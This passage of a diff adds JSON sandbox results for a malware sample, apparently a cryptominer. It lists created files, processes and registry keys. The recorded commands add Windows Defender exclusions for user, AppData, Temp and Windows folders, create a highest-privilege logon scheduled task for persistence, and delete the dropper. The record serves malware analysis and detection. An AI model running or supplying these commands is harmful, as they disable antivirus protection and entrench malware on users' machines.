+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\e5c9865ceab3d51e44db885cd3377ee0\\Microsoft.Management.Infrastructure.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\4b6994043bbc39d9e47433716afb9e98\\Microsoft.PowerShell.Security.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\4b6994043bbc39d9e47433716afb9e98\\Microsoft.PowerShell.Security.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\a78370d535d159d2691edea0727e654d\\Microsoft.PowerShell.Commands.Management.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\a78370d535d159d2691edea0727e654d\\Microsoft.PowerShell.Commands.Management.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\dac77e2bdc0040a1a2a446cbf77b6bae\\Microsoft.PowerShell.ConsoleHost.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\dac77e2bdc0040a1a2a446cbf77b6bae\\Microsoft.PowerShell.ConsoleHost.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\b5152c3c02957bbe4459505a39afde20\\System.Configuration.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\b5152c3c02957bbe4459505a39afde20\\System.Configuration.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\89bc329e8c65a9e13067c9776d925d78\\System.Core.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\89bc329e8c65a9e13067c9776d925d78\\System.Core.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\dcffb1d4b51a427f7c054b15597ef269\\System.Data.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\dcffb1d4b51a427f7c054b15597ef269\\System.Data.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\4ac88f62ef161467f8e9dd4985837e51\\System.DirectoryServices.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\4ac88f62ef161467f8e9dd4985837e51\\System.DirectoryServices.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.IO.Cb3b124c8#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f02732d562721457afde5c189a906d17\\System.Management.Automation.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f02732d562721457afde5c189a906d17\\System.Management.Automation.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\dee95ca75ccebe1cc18b31dca334cd53\\System.Management.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\dee95ca75ccebe1cc18b31dca334cd53\\System.Management.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\568282207f7c6c41d18e9e38637dbe77\\System.Numerics.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\568282207f7c6c41d18e9e38637dbe77\\System.Numerics.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\0935f5dce0a38689b9507cb1938fe436\\System.Transactions.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\0935f5dce0a38689b9507cb1938fe436\\System.Transactions.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\1fb6db2ce6d2887fe6f8f620cb092343\\System.Xml.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\1fb6db2ce6d2887fe6f8f620cb092343\\System.Xml.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\37a1d51f35918dd36a0d4e34cc91732e\\System.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\37a1d51f35918dd36a0d4e34cc91732e\\System.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\itami-miner\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\itami\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\3597805b7d7dce423abb491985dd28e8\\mscorlib.ni.dll"
+  ],
+  "processes_created": [
+    "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+    "C:\\Windows\\System32\\cmd.exe",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+    "C:\\Windows\\System32\\schtasks.exe",
+    "C:\\Windows\\System32\\services64.exe",
+    "C:\\Windows\\System32\\choice.exe",
+    "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.exe",
+    "C:\\Windows\\explorer.exe",
+    "cmd /c powershell -Command Add-MpPreference -ExclusionPath %UserProfile% & powershell -Command Add-MpPreference -ExclusionPath %AppData% & powershell -Command Add-MpPreference -ExclusionPath %Temp% & powershell -Command Add-MpPreference -ExclusionPath %SystemRoot% & exit",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\admin",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Roaming",
+    "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Users\\<USER>\\Downloads\\itami.exe",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Users\\<USER>\\Downloads\\itami.exe",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Local\\\\Temp",
+    "C:\\Windows\\System32\\cmd.exe /c schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\" & exit",
+    "schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\"",
+    "C:\\Windows\\system32\\services64.exe",
+    "C:\\Windows\\System32\\cmd.exe /C choice /C Y /N /D Y /T 3 & Del C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Windows",
+    "choice /C Y /N /D Y /T 3",
+    "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Windows\\system32\\services64.exe",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Windows\\system32\\services64.exe",
+    "C:\\Windows\\system32\\Microsoft\\Libs\\sihost64.exe"
+  ],
+  "registry_keys_set": [
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\02FAF3E291435468607857694DF5E45B68851868\\Blob",
+      "value": "7E 00 00 00 01 00 00 00 08 00 00 00 00 00 63 F5 89 26 D7 01 09 00 00 00 01 00 00 00 54 00 00 00 30 52 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 0A 2B 06 01 04 01 82 37 0A 03 04 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 06 06 08 2B 06 01 05 05 07 03 07 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 04 00 00 00 01 00 00 00 10 00 00 00 1D 35 54 04 85 78 B0 3F 42 42 4D BF 20 73 0A 3F 0F 00 00 00 01 00 00 00 14 00 00 00 09 B9 10 5C 5B BA 24 34 3C A7 F3 41 C6 24 E1 83 F6 EE 7C 1B 0B 00 00 00 01 00 00 00 26 00 00 00 53 00 65 00 63 00 74 00 69 00 67 00 6F 00 20 00 28 00 41 00 64 00 64 00 54 00 72 00 75 00 73 00 74 00 29 00 00 00 62 00 00 00 01 00 00 00 20 00 00 00 68 7F A4 51 38 22 78 FF F0 C8 B1 1F 8D 43 D5 76 67 1C 6E B2 BC EA B4 13 FB 83 D9 65 D0 6D 2F F2 14 00 00 00 01 00 00 00 14 00 00 00 AD BD 98 7A 34 B4 26 F7 FA C4 26 54 EF 03 BD E0 24 CB 54 1A 1D 00 00 00 01 00 00 00 10 00 00 00 06 F9 58 3C 00 A7 63 C2 3F B9 E0 65 A3 36 6D 55 03 00 00 00 01 00 00 00 14 00 00 0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\627F8D7827656399D27D7F9044C9FEB3F33EFA9A\\Blob",
+      "value": "09 00 00 00 01 00 00 00 16 00 00 00 30 14 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 01 04 00 00 00 01 00 00 00 10 00 00 00 06 9F 69 79 16 66 90 02 1B 8C 8C A2 C3 07 6F 3A 0F 00 00 00 01 00 00 00 10 00 00 00 5F 3D 1A A6 F4 71 A7 60 66 3E B7 EF 25 42 81 EF 53 00 00 00 01 00 00 00 25 00 00 00 30 23 30 21 06 0B 60 86 48 01 86 F8 45 01 07 30 01 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 62 00 00 00 01 00 00 00 20 00 00 00 AB 70 36 36 5C 71 54 AA 29 C2 C2 9F 5D 41 91 16 3B 16 2A 22 25 01 13 57 D5 6D 07 FF A7 BC 1F 72 14 00 00 00 01 00 00 00 14 00 00 00 5F F3 24 6C 8F 91 24 AF 9B 5F 3E B0 34 6A F4 2D 5C A8 5D CC 1D 00 00 00 01 00 00 00 10 00 00 00 D4 80 3A C3 6C 25 68 17 D4 EC 59 36 F2 9B C4 E7 0B 00 00 00 01 00 00 00 0E 00 00 00 74 00 68 00 61 00 77 00 74 00 65 00 00 00 68 00 00 00 01 00 00 00 08 00 00 00 00 00 87 6A CE 99 D1 01 03 00 00 00 01 00 00 00 14 00 00 00 62 7F 8D 78 27 65 63 99 D2 7D 7F 90 44 C9 FE B3 F3 3E FA 9A 19 00 00 00 01 00 00 00 10 00 00 00 5D C4 5E 2C D1 84 57 91 B"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASMANCS\\FileDirectory",
+      "value": "%windir%\\tracing"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASMANCS\\MaxFileSize",
+      "value": "1048576"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASMANCS\\ConsoleTracingMask",
+      "value": "4294901760"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASMANCS\\FileTracingMask",
+      "value": "4294901760"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASMANCS\\EnableConsoleTracing",
+      "value": "0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASMANCS\\EnableFileTracing",
+      "value": "0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\B1BC968BD4F49D622AA89A81F2150152A41D829C\\Blob",
+      "value": "7A 00 00 00 01 00 00 00 0C 00 00 00 30 0A 06 08 2B 06 01 05 05 07 03 09 09 00 00 00 01 00 00 00 68 00 00 00 30 66 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 0A 2B 06 01 04 01 82 37 0A 03 04 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 08 02 02 06 08 2B 06 01 05 05 07 03 06 06 08 2B 06 01 05 05 07 03 07 06 08 2B 06 01 05 05 07 03 09 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 04 00 00 00 01 00 00 00 10 00 00 00 3E 45 52 15 09 51 92 E1 B7 5D 37 9F B1 87 29 8A 0F 00 00 00 01 00 00 00 14 00 00 00 5A 6D 07 B6 37 1D 96 6A 2F B6 BA 92 82 8C E5 51 2A 49 51 3D 0B 00 00 00 01 00 00 00 30 00 00 00 47 00 6C 00 6F 00 62 00 61 00 6C 00 53 00 69 00 67 00 6E 00 20 00 52 00 6F 00 6F 00 74 00 20 00 43 00 41 00 20 00 2D 00 20 00 52 00 31 00 00 00 62 00 00 00 01 00 00 00 20 00 00 00 EB D4 10 40 E4 BB 3E C7 42 C9 E3 81 D3 1E F2 A4 1A 48 B6 68 5C 96 E7 CE F3 C1 DF 6C D4 33 1C 99 14 00 00 00 01 00 00 00 14 00 00 00 60 7B 66 1A 45 0D 97 CA 89 50 2F 7D 04 CD 34 A8 FF FC FD 4B 1D 00 00 00 01 0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\D1EB23A46D17D68FD92564C2F1F1601764D8E349\\Blob",
+      "value": "53 00 00 00 01 00 00 00 43 00 00 00 30 41 30 22 06 0C 2B 06 01 04 01 B2 31 01 02 01 05 01 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 30 1B 06 05 67 81 0C 01 03 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 19 00 00 00 01 00 00 00 10 00 00 00 2A A1 C0 5E 2A E6 06 F1 98 C2 C5 E9 37 C9 7A A2 03 00 00 00 01 00 00 00 14 00 00 00 D1 EB 23 A4 6D 17 D6 8F D9 25 64 C2 F1 F1 60 17 64 D8 E3 49 1D 00 00 00 01 00 00 00 10 00 00 00 2E 0D 68 75 87 4A 44 C8 20 91 2E 85 E9 64 CF DB 14 00 00 00 01 00 00 00 14 00 00 00 A0 11 0A 23 3E 96 F1 07 EC E2 AF 29 EF 82 A5 7F D0 30 A4 B4 0B 00 00 00 01 00 00 00 1C 00 00 00 53 00 65 00 63 00 74 00 69 00 67 00 6F 00 20 00 28 00 41 00 41 00 41 00 29 00 00 00 62 00 00 00 01 00 00 00 20 00 00 00 D7 A7 A0 FB 5D 7E 27 31 D7 71 E9 48 4E BC DE F7 1D 5F 0C 3E 0A 29 48 78 2B C8 3E E0 EA 69 9E F4 0F 00 00 00 01 00 00 00 14 00 00 00 3E 8E 64 87 F8 FD 27 D3 22 A2 69 A7 1E DA AC 5D 57 81 12 86 04 00 00 00 01 00 00 00 10 00 0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\742C3192E607E424EB4549542BE1BBC53E6174E2\\Blob",
+      "value": "68 00 00 00 01 00 00 00 08 00 00 00 00 00 3D B6 5B D9 D5 01 7E 00 00 00 01 00 00 00 08 00 00 00 00 00 10 C5 1E 92 D2 01 62 00 00 00 01 00 00 00 20 00 00 00 E7 68 56 34 EF AC F6 9A CE 93 9A 6B 25 5B 7B 4F AB EF 42 93 5B 50 A2 65 AC B5 CB 60 27 E4 4E 70 19 00 00 00 01 00 00 00 10 00 00 00 91 16 1B 89 4B 11 7E CD C2 57 62 8D B4 60 CC 04 03 00 00 00 01 00 00 00 14 00 00 00 74 2C 31 92 E6 07 E4 24 EB 45 49 54 2B E1 BB C5 3E 61 74 E2 1D 00 00 00 01 00 00 00 10 00 00 00 27 B3 51 76 67 33 1C E2 C1 E7 40 02 B5 FF 22 98 14 00 00 00 01 00 00 00 14 00 00 00 E2 7F 7B D8 77 D5 DF 9E 0A 3F 9E B4 CB 0E 2E A9 EF DB 69 77 0B 00 00 00 01 00 00 00 46 00 00 00 56 00 65 00 72 00 69 00 53 00 69 00 67 00 6E 00 20 00 43 00 6C 00 61 00 73 00 73 00 20 00 33 00 20 00 50 00 75 00 62 00 6C 00 69 00 63 00 20 00 50 00 72 00 69 00 6D 00 61 00 72 00 79 00 20 00 43 00 41 00 00 00 04 00 00 00 01 00 00 00 10 00 00 00 10 FC 63 5D F6 26 3E 0D F3 25 BE 5F 79 CD 67 67 0F 00 00 00 01 00 00 00 10 00 00 00 D7 C6 3B E0 83 7D BA BF 88 1D 4F BF 5F 98 6A D"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43\\Blob",
+      "value": "09 00 00 00 01 00 00 00 34 00 00 00 30 32 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 19 00 00 00 01 00 00 00 10 00 00 00 74 99 66 CE CC 95 C1 87 41 94 CA 72 03 F9 B6 20 03 00 00 00 01 00 00 00 14 00 00 00 05 63 B8 63 0D 62 D7 5A BB C8 AB 1E 4B DF B5 A8 99 B2 4D 43 1D 00 00 00 01 00 00 00 10 00 00 00 4F 5F 10 69 30 39 8D 09 10 7B 40 C3 C7 CA 8F 1C 0B 00 00 00 01 00 00 00 12 00 00 00 44 00 69 00 67 00 69 00 43 00 65 00 72 00 74 00 00 00 14 00 00 00 01 00 00 00 14 00 00 00 45 EB A2 AF F4 92 CB 82 31 2D 51 8B A7 A7 21 9D F3 6D C8 0F 62 00 00 00 01 00 00 00 20 00 00 00 3E 90 99 B5 01 5E 8F 48 6C 00 BC EA 9D 11 1E E7 21 FA BA 35 5A 89 BC F1 DF 69 56 1E 3D C6 32 5C 0F 00 00 00 01 00 00 00 14 00 00 00 6D CA 5B D0 0D CF 1C 0F 32 70 59 D3 74 B2 9C A6 E3 C5 0A A6 04 00 00 00 01 00 00 00 10 00 00 00 87 CE 0B 7B 2A 0E 49 00 E1 58 71 9B 37 A8 93 72 53 00 00 00 01 00 00 0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\8782C6C304353BCFD29692D2593E7D44D934FF11\\Blob",
+      "value": "09 00 00 00 01 00 00 00 34 00 00 00 30 32 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 19 00 00 00 01 00 00 00 10 00 00 00 E6 09 7C 8F 76 AB 46 18 99 64 B5 FE 3C D5 C1 D8 0F 00 00 00 01 00 00 00 14 00 00 00 31 D2 54 C6 26 74 C3 51 D6 E6 21 2F 6E 53 17 5A AD E3 17 5C 53 00 00 00 01 00 00 00 26 00 00 00 30 24 30 22 06 0C 60 86 48 01 86 FD 64 01 01 02 04 01 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 62 00 00 00 01 00 00 00 20 00 00 00 F1 C1 B5 0A E5 A2 0D D8 03 0E C9 F6 BC 24 82 3D D3 67 B5 25 57 59 B4 E7 1B 61 FC E9 F7 37 5D 73 14 00 00 00 01 00 00 00 14 00 00 00 42 32 B6 16 FA 04 FD FE 5D 4B 7A C3 FD F7 4C 40 1D 5A 43 AF 0B 00 00 00 01 00 00 00 14 00 00 00 54 00 72 00 75 00 73 00 74 00 77 00 61 00 76 00 65 00 00 00 1D 00 00 00 01 00 00 00 10 00 00 00 EB 1E 70 CF 1E AD 11 52 15 3E 79 EC 90 ED AB A4 03 00 00 00 01 00 00 00 14 00 00 00 87 82 C6 C3 04 35 3B CF D2 96 92 D2 59 3E 7D 44 D9 34 FF 1"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\55A6723ECBF2ECCDC3237470199D2ABE11E381D1\\Blob",
+      "value": "7A 00 00 00 01 00 00 00 0C 00 00 00 30 0A 06 08 2B 06 01 05 05 07 03 09 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 04 00 00 00 01 00 00 00 10 00 00 00 CA FB 40 A8 4E 39 92 8A 1D FE 8E 2F C4 27 EA EF 03 00 00 00 01 00 00 00 14 00 00 00 55 A6 72 3E CB F2 EC CD C3 23 74 70 19 9D 2A BE 11 E3 81 D1 7E 00 00 00 01 00 00 00 08 00 00 00 00 00 04 2B EB 77 D5 01 7F 00 00 00 01 00 00 00 0C 00 00 00 30 0A 06 08 2B 06 01 05 05 07 03 09 1D 00 00 00 01 00 00 00 10 00 00 00 7C AB 1E 1E 09 5F 21 F0 70 67 08 EC 80 AF FD 30 14 00 00 00 01 00 00 00 14 00 00 00 B5 03 F7 76 3B 61 82 6A 12 AA 18 53 EB 03 21 94 BF FE CE CA 62 00 00 00 01 00 00 00 20 00 00 00 FD 73 DA D3 1C 64 4F F1 B4 3B EF 0C CD DA 96 71 0B 9C D9 87 5E CA 7E 31 70 7A F3 E9 6D 52 2B BD 53 00 00 00 01 00 00 00 24 00 00 00 30 22 30 20 06 0A 2B 06 01 04 01 BD 47 0D 18 01 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 0B 00 00 00 01 00 00 00 3C 00 00 00 54 00 2D 00 54 00 65 00 6C 00 65 00 53 00 65 00 63 00 20 00 47 00 6C 00 6F 00 62 00 61 00 6C 00 20 0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\3679CA35668772304D30A5FB873B0FA77BB70D54\\Blob",
+      "value": "7E 00 00 00 01 00 00 00 08 00 00 00 00 C0 03 2F 2D F8 D6 01 09 00 00 00 01 00 00 00 34 00 00 00 30 32 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 19 00 00 00 01 00 00 00 10 00 00 00 AD 6D 6F F3 1B 24 01 31 51 F2 79 E2 6A 8C 33 24 0F 00 00 00 01 00 00 00 20 00 00 00 17 FE 16 F3 94 EC 70 A5 BB 0C 67 84 CA B4 0B 1E 61 02 5A E9 D5 0E CA A0 53 1D 6B 4D 99 7B BC 59 0B 00 00 00 01 00 00 00 60 00 00 00 56 00 65 00 72 00 69 00 53 00 69 00 67 00 6E 00 20 00 55 00 6E 00 69 00 76 00 65 00 72 00 73 00 61 00 6C 00 20 00 52 00 6F 00 6F 00 74 00 20 00 43 00 65 00 72 00 74 00 69 00 66 00 69 00 63 00 61 00 74 00 69 00 6F 00 6E 00 20 00 41 00 75 00 74 00 68 00 6F 00 72 00 69 00 74 00 79 00 00 00 62 00 00 00 01 00 00 00 20 00 00 00 23 99 56 11 27 A5 71 25 DE 8C EF EA 61 0D DF 2F A0 78 B5 C8 06 7F 4E 82 82 90 BF B8 60 E8 4B 3C 14 00 00 00 01 00 00 00 14 00 00 00 B6 77 FA 69 48 4"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\WBEM\\CIMOM\\ConfigValueEssNeedsLoading",
+      "value": "1"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\WBEM\\CIMOM\\List of event-active namespaces",
+      "value": "00 00 54 00 45 00 76 00 65 00 6E 00 74 00 4C 00 6F 00 67 00 45 00 76 00 65 00 6E 00 74 00 43 00 6F 00 6E 00 73 00 75 00 6D 00 65 00 72 00"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25\\Blob",
+      "value": "09 00 00 00 01 00 00 00 34 00 00 00 30 32 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 19 00 00 00 01 00 00 00 10 00 00 00 BA 4F 39 72 E7 AE D9 DC CD C2 10 DB 59 DA 13 C9 03 00 00 00 01 00 00 00 14 00 00 00 5F B7 EE 06 33 E2 59 DB AD 0C 4C 9A E6 D3 8F 1A 61 C7 DC 25 1D 00 00 00 01 00 00 00 10 00 00 00 8F 76 B9 81 D5 28 AD 47 70 08 82 45 E2 03 1B 63 0B 00 00 00 01 00 00 00 12 00 00 00 44 00 69 00 67 00 69 00 43 00 65 00 72 00 74 00 00 00 14 00 00 00 01 00 00 00 14 00 00 00 B1 3E C3 69 03 F8 BF 47 01 D4 98 26 1A 08 02 EF 63 64 2B C3 62 00 00 00 01 00 00 00 20 00 00 00 74 31 E5 F4 C3 C1 CE 46 90 77 4F 0B 61 E0 54 40 88 3B A9 A0 1E D0 0B A6 AB D7 80 6E D3 B1 18 CF 0F 00 00 00 01 00 00 00 14 00 00 00 E3 5E F0 8D 88 4F 0A 0A DE 2F 75 E9 63 01 CE 62 30 F2 13 A8 04 00 00 00 01 00 00 00 10 00 00 00 D4 74 DE 57 5C 39 B2 D3 9C 85 83 C5 C0 65 49 8A 53 00 00 00 01 00 00 0"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\services64\\Index"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\services64\\Id"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Services\\BITS\\Performance\\PerfMMFileName",
+      "value": "Global\\MMF_BITS_s"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\DAC9024F54D8F6DF94935FB1732638CA6AD77C13\\Blob",
+      "value": "7E 00 00 00 01 00 00 00 08 00 00 00 00 C0 01 B3 96 67 D6 01 09 00 00 00 01 00 00 00 42 00 00 00 30 40 06 08 2B 06 01 05 05 07 03 02 06 0A 2B 06 01 04 01 82 37 0A 03 0C 06 0A 2B 06 01 04 01 82 37 0A 03 04 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 04 00 00 00 01 00 00 00 10 00 00 00 41 03 52 DC 0F F7 50 1B 16 F0 02 8E BA 6F 45 C5 0F 00 00 00 01 00 00 00 14 00 00 00 5B CA A1 C2 78 0F 0B CB 5A 90 77 04 51 D9 6F 38 96 3F 01 2D 62 00 00 00 01 00 00 00 20 00 00 00 06 87 26 03 31 A7 24 03 D9 09 F1 05 E6 9B CF 0D 32 E1 BD 24 93 FF C6 D9 20 6D 11 BC D6 77 07 39 0B 00 00 00 01 00 00 00 1E 00 00 00 44 00 53 00 54 00 20 00 52 00 6F 00 6F 00 74 00 20 00 43 00 41 00 20 00 58 00 33 00 00 00 14 00 00 00 01 00 00 00 14 00 00 00 C4 A7 B1 A4 7B 2C 71 FA DB E1 4B 90 75 FF C4 15 60 85 89 10 1D 00 00 00 01 00 00 00 10 00 00 00 45 58 D5 12 EE CB 27 46 49 20 89 7D E7 B6 60 53 03 00 00 00 01 00 00 00 14 00 00 00 DA C9 02 4F 54 D8 F6 DF 94 93 5F B1 73 26 38 CA 6A D7 7C 13 19 00 00 00 01 0"
+    },
+    {
+      "key": "\\\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Iran Standard Time\\TZI"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Control\\BackupRestore\\FilesNotToBackup\\BITS_LOG",
+      "value": "%windir%\\System32\\Bits.log\n"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Control\\BackupRestore\\FilesNotToBackup\\BITS_BAK",
+      "value": "%windir%\\System32\\Bits.bak\n"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\D4DE20D05E66FC53FE1A50882C78DB2852CAE474\\Blob",
